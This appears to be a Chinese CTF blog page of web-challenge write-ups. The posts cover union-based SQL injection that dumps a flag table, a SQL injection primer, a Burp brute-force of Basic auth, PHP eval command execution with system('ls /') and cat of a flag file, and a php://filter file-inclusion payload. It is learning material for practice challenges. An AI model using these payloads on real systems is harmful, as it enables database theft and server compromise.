<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> slect <span class="number">1</span>,<span class="number">2</span></span><br></pre></td></tr></table></figure>

<p><img src="/../images/web-%E6%95%B4%E6%95%B0%E5%9E%8B%E6%B3%A8%E5%85%A5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70-16755071989386.png" alt="在这里插入图片描述"></p>
<p>7.知道注入点在2的位置,爆库</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database()</span><br></pre></td></tr></table></figure>

<p><img src="/../images/web-%E6%95%B4%E6%95%B0%E5%9E%8B%E6%B3%A8%E5%85%A5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70-16755072365458.png" alt="在这里插入图片描述"></p>
<p>8.爆库成功，知道库名为:<code>sqli</code>，爆表</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;sqli&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/../images/web-%E6%95%B4%E6%95%B0%E5%9E%8B%E6%B3%A8%E5%85%A5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70-167550727522210.png" alt="在这里插入图片描述"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;sqli&#x27;</span> limit <span class="number">1</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/../images/web-%E6%95%B4%E6%95%B0%E5%9E%8B%E6%B3%A8%E5%85%A5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70-167550732381912.png" alt="在这里插入图片描述"></p>
<p>9.爆表成功，知道库名为:<code>news</code>和<code>flag</code>，使用<code>flag</code>这个表，爆字段名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;sqli&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/../images/web-%E6%95%B4%E6%95%B0%E5%9E%8B%E6%B3%A8%E5%85%A5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70-167550736870814.png" alt="在这里插入图片描述"></p>
<p>10.爆表字段名，知道字段名为<code>flag</code>，使用<code>flag</code>这个字段名，爆字段内容</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> flag <span class="keyword">from</span> sqli.flag limit <span class="number">0</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/../images/web-%E6%95%B4%E6%95%B0%E5%9E%8B%E6%B3%A8%E5%85%A5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70-167550740381216.png" alt="在这里插入图片描述"></p>
<p>10.注入成功，得到<code>flag</code></p>
<p>**ctfhub{ba713f7270fc403bf7983f6d} **</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/04/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/Dvgd.jpg">
      <meta itemprop="name" content="Dvgd">
      <meta itemprop="description" content="Welcome to my blog.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Dvgd">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/04/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">web-sql注入学习</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-02-04 16:26:32 / 修改时间：16:39:43" itemprop="dateCreated datePublished" datetime="2023-02-04T16:26:32+08:00">2023-02-04</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="SQL注入相关知识"><a href="#SQL注入相关知识" class="headerlink" title="SQL注入相关知识"></a>SQL注入相关知识</h2><h3 id="一、SQl注入的基础"><a href="#一、SQl注入的基础" class="headerlink" title="一、SQl注入的基础"></a>一、SQl注入的基础</h3><p>1.介绍SQL注入<br>SQL注入就是指WEB应用程序对用户输入数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且参数代入数据库查询，攻击者可以通过构造不同的SQL语句来是实现对数据库的任意操作。</p>
<p>一般情况下，开发人员可以使用动态SQL语句创建通用、灵活的应用。动态SQL语句是在执行过程中构造的，他根据不同的条件产生不同的SQL语句。当开发人员在运行过程中需要根据不同的查询标准决定提取什么字段(如select语句)，或者根据不同的条件选择不同的查询表时，动态的SQL语句会非常有用。</p>
<p>下面以PHP语句为例。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM user WHERE id = <span class="subst">$_GET</span>[&#x27;id&#x27;]&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>由于这里的参数ID可控，且带入数据库查询，所以非法用户可以任意拼接SQL语句进行攻击。</p>
<h3 id="2-SQL注入的原理"><a href="#2-SQL注入的原理" class="headerlink" title="2.SQL注入的原理"></a>2.SQL注入的原理</h3><p>SQL注入漏洞的产生需要满足以下两个条件。<br>(1)参数用户可控：前端传给后端的参数内容是用户可以控制的。<br>(2)参数代入数据库查询：传入的参数拼接到SQL语句，且带入数据库查询。<br>当传入的ID参数为1时，数据库执行的代码如下所示</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>然而当传入的ID参数为and 1&#x3D;1时，执行的SQL语句如下所示</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>因为1&#x3D;1为真，且where语句中id&#x3D;1也为真，所以页面会返回与id&#x3D;1相同的结果。当传入的ID参数为and 1&#x3D;2时，由于1&#x3D;2不成立，所以返回假，页面就会返回与id&#x3D;1不同的结果。</p>
<p>在实际环境中，凡是满足上述两个条件的参数皆可能存在SQL注入漏洞，因此开发者需秉承”外部参数皆不可信的原则”进行开发。</p>
<h3 id="3-与MYSQL注入相关的知识点"><a href="#3-与MYSQL注入相关的知识点" class="headerlink" title="3.与MYSQL注入相关的知识点"></a>3.与MYSQL注入相关的知识点</h3><p>在MYSQL5.0版本之后，MySQL默认在数据库中存放一个”information_schema”的数据库，在该库中，需要记住三个表名，分别是SCHEMATA、TABLES和COLUMNS。<br>SCHEMATA表存储该用户创建的所有数据库名的库名</p>
<p><img src="/../images/web-%E6%95%B4%E6%95%B0%E5%9E%8B%E6%B3%A8%E5%85%A5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述"></p>
<p>TABLES表存储该用户创建的所有的数据库的库名和表名，</p>
<p>库名为：<code>TABLES_SCHEMA</code>，表名为：<code>TABLE_NAME</code>，字段名为：<code>COLUMN_NAME</code>.</p>
<p><strong>1.MySQL查询语句</strong><br>在知道一条已知条件时，语句如下所示。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> 要查询的字段名 <span class="keyword">from</span> 库名.表名 <span class="keyword">where</span> 已知条件的字段名<span class="operator">=</span><span class="string">&#x27;已知条件的值&#x27;</span></span><br></pre></td></tr></table></figure>

<p><strong>2.limit的用法</strong><br>limit的使用格式为limit m,n,其中m是指记录开始的位置，从0开始，表示第一条记录；n是指n条记录。例如limit 0,1表示从第一条记录开始，取一条记录，不使用limit和使用limit查询的结果</p>
<p><img src="/../images/web-%E6%95%B4%E6%95%B0%E5%9E%8B%E6%B3%A8%E5%85%A5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70-16754998107822.png" alt="在这里插入图片描述"></p>
<p><strong>3.需要记住的几个函数</strong><br>·<code>database()</code> 当前网站使用的数据库<br>·<code>version()</code> 当前MySQL的版本<br>·<code>user()</code> 当前MySQL的用户</p>
<p><strong>4.注释符</strong><br>在MySQL中，常见注释符的表达方式：<code>#或--空格或/**/</code>。</p>
<p><strong>5.内联注释</strong><br>内联注释的形式:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*!code*/</span></span><br></pre></td></tr></table></figure>

<p>内联注释可以用于整个sql语句中，用来执行SQL语句</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="comment">/*!union*/</span> <span class="comment">/*!select*/</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/01/%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/Dvgd.jpg">
      <meta itemprop="name" content="Dvgd">
      <meta itemprop="description" content="Welcome to my blog.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Dvgd">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/01/%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81/" class="post-title-link" itemprop="url">web-基础认证</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-02-01 22:06:29" itemprop="dateCreated datePublished" datetime="2023-02-01T22:06:29+08:00">2023-02-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-02-05 13:56:03" itemprop="dateModified" datetime="2023-02-05T13:56:03+08:00">2023-02-05</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>1、打开题目环境</p>
<p><img src="/../images/web-%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81/115e8182e56a4dc9bb03b150c2434453.png" alt="img"></p>
<p>2、点击click跳出来一个登录弹窗，随便输入用户名和密码登录试试，没有返回任何有用信息</p>
<p><img src="/../images/web-%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81/11af9f2d902545a89457537ad97031cd.png" alt="img"></p>
<p>3、查看附件，得到一堆密码，应该是要直接爆破</p>
<p><img src="/../images/web-%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81/8a93fcba23064b469ef3f2dabe1995c6.png" alt="img"></p>
<p>4、点击click<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E6%8A%93%E5%8C%85&spm=1001.2101.3001.7020">抓包</a>后发送到repeater模块，重新发包得到”Do u know admin”的信息，猜测用户名即为admin</p>
<p><img src="/../images/web-%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81/e6bc18b23c544e5aa3d5108c24479dd4.png" alt="img"></p>
<p>4、输入用户名和密码后抓包，看到一串<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=base64%E5%8A%A0%E5%AF%86&spm=1001.2101.3001.7020">base64加密</a>过的字符</p>
<p><img src="/../images/web-%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81/22cf876256334313b0d68bdd34b8a523.png" alt="img"></p>
<p>丢到解码器里解码，发现是我刚输进去的用户名和密码，中间用冒号隔开了（冒号划重点！</p>
<p><img src="/../images/web-%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81/0fe41ea078914b1d80c09fa9c4927f76.png" alt="img"></p>
<p>6、把包发送到爆破模块，给刚刚的base64密码添加变量（这里截图截错了，添加完变量后应该这段字符前后各有一个§符号）</p>
<p><img src="/../images/web-%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81/8d5a666fff6f4e6babb6f3abca86c959.png" alt="img"></p>
<p> 7、在payload options[simple list]模块把题目附件里面的密码粘贴进去</p>
<p>8、添加前缀，admin后面一定不要忘记加冒号！</p>
<p><img src="/../images/web-%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81/8de3db8daf804ad3b08cf334e3fcc49e.png" alt="img"></p>
<p> 添加base64编码</p>
<p><img src="/../images/web-%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81/8c03ad1544f440e09eaf0cbc7e7c4a5a.png" alt="img"></p>
<p> 9、把特殊符号的url编码取消，不然&#x3D;会被转换成%3d</p>
<p><img src="/../images/web-%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81/be2d147292674f10b416b3aa2517e580.png" alt="img"></p>
<p> 10、全部布置完是这个样子</p>
<p><img src="/../images/web-%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81/2ed2adeda37b4b4fa4a65e0cf3cfe290.png" alt="img"></p>
<p>11、开始爆破，发现长度不一样的了</p>
<p><img src="/../images/web-%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81/2a9ba7de13214ee1a7467e3f8f6f7bba.png" alt="img"></p>
<p> 12、在raw模块复制后查看response，得到flag</p>
<p><img src="/../images/web-%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81/6001e858ddba4d7c831cfe370005aef2.png" alt="img"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/01/29/easyrce/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/Dvgd.jpg">
      <meta itemprop="name" content="Dvgd">
      <meta itemprop="description" content="Welcome to my blog.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Dvgd">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/01/29/easyrce/" class="post-title-link" itemprop="url">easyrce</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-01-29 12:25:36 / 修改时间：12:35:25" itemprop="dateCreated datePublished" datetime="2023-01-29T12:25:36+08:00">2023-01-29</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>命令执行，连过滤都没有，直接构造命令</p>
<h3 id="1-ls列出文件"><a href="#1-ls列出文件" class="headerlink" title="1.ls列出文件"></a>1.ls列出文件</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?system=(<span class="string">&quot;ls /&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/../images/easyrce/2496929-20220627215105465-1604391209.jpg" alt="img"></p>
<h2 id="2-cat查看可疑文件flllllaaaaaaggggggg"><a href="#2-cat查看可疑文件flllllaaaaaaggggggg" class="headerlink" title="2.cat查看可疑文件flllllaaaaaaggggggg"></a>2.cat查看可疑文件flllllaaaaaaggggggg</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?url=<span class="title function_ invoke__">system</span>(cat /flllllaaaaaaggggggg);</span><br></pre></td></tr></table></figure>

<p><img src="/../images/easyrce/2496929-20220627215258362-300026015.jpg" alt="img"></p>
<p>要记得最后以分号结尾，不然不执行</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/01/29/web-include/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/Dvgd.jpg">
      <meta itemprop="name" content="Dvgd">
      <meta itemprop="description" content="Welcome to my blog.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Dvgd">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/01/29/web-include/" class="post-title-link" itemprop="url">web-include</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-01-29 10:24:16 / 修改时间：10:27:35" itemprop="dateCreated datePublished" datetime="2023-01-29T10:24:16+08:00">2023-01-29</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>我们看向这个题目的页面</p>
<p><img src="/../images/web-include/1620.png" alt="img"></p>
<p>他提示我们传入一个file，也就是我们可以直接在url里面进行get传参，我们传入一个url?file&#x3D;1看看会返回什么</p>
<p><img src="/../images/web-include/1620-16749591749692.png" alt="img"></p>
<p>提示我们flag在flag.php里面，我们首先可以想到的是文件包含，然后我们看到了代码的第二行，allow_url_include:on</p>
<p>我们可以联想到php伪协议，这样我们就可以得到这一道题目的思路了。</p>
<p>使用php:&#x2F;&#x2F;filter读取到flag.php，将flag.php以base64的形式给显示出来，这样的话我们可以这样构造我们的payload</p>
<p>url?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
<p>我们来解读一下上面的payload：</p>
<p>首先我们要传入file关键字的GET参数传递，php:&#x2F;&#x2F;是一种协议名称，php:&#x2F;&#x2F;filter是一种访问本地文件的协议，&#x2F;read&#x3D;convert.base64-encode表示的是读取的方式是base64编码后resouce&#x3D;flag.php表示目标文件为flag.php</p>
<p>也就是说，flag.php最终会以base64的形式显示出来，我们最后使用base64解码就可以了。</p>
<p>理论存在，实践开始：</p>
<p>我们使用上面的payload</p>
<p><img src="/../images/web-include/1620-16749592011614.png" alt="img"></p>
<p>然后我们得到了一段base64，我们使用base64解密，因该就可以得到答案了</p>
<p><img src="/../images/web-include/1620-16749592431156.png" alt="img"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/01/28/web-jicao/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/Dvgd.jpg">
      <meta itemprop="name" content="Dvgd">
      <meta itemprop="description" content="Welcome to my blog.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Dvgd">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/01/28/web-jicao/" class="post-title-link" itemprop="url">web-jicao</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-01-28 21:55:08 / 修改时间：21:59:06" itemprop="dateCreated datePublished" datetime="2023-01-28T21:55:08+08:00">2023-01-28</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$json</span>=<span class="title function_ invoke__">json_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;json&#x27;</span>],<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$id</span>==<span class="string">&quot;wllmNB&quot;</span>&amp;&amp;<span class="variable">$json</span>[<span class="string">&#x27;x&#x27;</span>]==<span class="string">&quot;wllm&quot;</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span> <span class="variable">$flag</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>阅读代码可知当传入一个post型的参数id与wllmNB相等并且传入一个get型的参数json；</p>
<p>但是这里有一个函数json_decode，上网搜索可知json_decode这个函数对JSON格式的字符串进行编码</p>
<p>参数json：待解码的json string格式的字符串，所以我们需要传入get型的参数json并且对他进行解码</p>
<p>JSON 格式的字符串<br>$json &#x3D; ‘{“a”:”php”,”b”:”mysql”,”c”:3}’;</p>
<p>其中a为键，php为a的键值。</p>
<p>所以我们需要传入get:json&#x3D;{“x”:”wllm”}和post:id&#x3D;wllNB便可以得到flag。</p>
<p><img src="/../images/web-jicao/3023439-20221104120952140-1155478415.png" alt="img"></p>
<h5 id="NSSCTF-bc1f4ffb-af59-4738-a613-25e55f1a6af9"><a href="#NSSCTF-bc1f4ffb-af59-4738-a613-25e55f1a6af9" class="headerlink" title="NSSCTF{bc1f4ffb-af59-4738-a613-25e55f1a6af9}"></a>NSSCTF{bc1f4ffb-af59-4738-a613-25e55f1a6af9}</h5>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Dvgd"
      src="/images/Dvgd.jpg">
  <p class="site-author-name" itemprop="name">Dvgd</p>
  <div class="site-description" itemprop="description">Welcome to my blog.</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">17</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">2</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">2</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/yourname" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;yourname" rel="noopener" target="_blank"><i class="github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://weibo.com/yourname" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;yourname" rel="noopener" target="_blank"><i class="weibo fa-fw"></i>Weibo</a>
      </span>
  </div>



      </div>
	   <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1861579836&auto=1&height=66"></iframe>
    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Dvgd</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
